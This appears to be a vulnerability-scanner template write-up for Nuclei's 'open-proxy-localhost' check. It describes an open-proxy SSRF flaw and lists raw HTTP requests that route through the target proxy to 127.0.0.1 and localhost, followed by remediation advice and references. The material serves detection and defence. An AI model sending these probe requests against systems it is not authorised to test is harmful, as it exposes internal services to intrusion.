# Nuclei Template: Open Proxy to Other Web Ports via Proxy's localhost Interface
**Template ID:** open-proxy-localhost
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-441
**Source:** Nuclei Template (`open-proxy-localhost.yaml`)

## Vulnerability Information & PoC

## Description
The host is configured as a proxy which allows access to web ports on the host's internal interface.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET http://somethingthatdoesnotexist/ HTTP/1.1
Host: somethingthatdoesnotexist

GET http://127.0.0.1/ HTTP/1.1
Host: 127.0.0.1

GET https://127.0.0.1/ HTTP/1.1
Host: 127.0.0.1

GET http://localhost/ HTTP/1.1
Host: localhost

GET https://localhost/ HTTP/1.1
Host: localhost
```

## Remediation
Disable the proxy or restrict configuration to only allow access to approved hosts/ports.

## References
- https://blog.projectdiscovery.io/abusing-reverse-proxies-internal-access/
- https://en.wikipedia.org/wiki/Open_proxy
- https://www.acunetix.com/vulnerabilities/web/apache-configured-to-run-as-proxy/
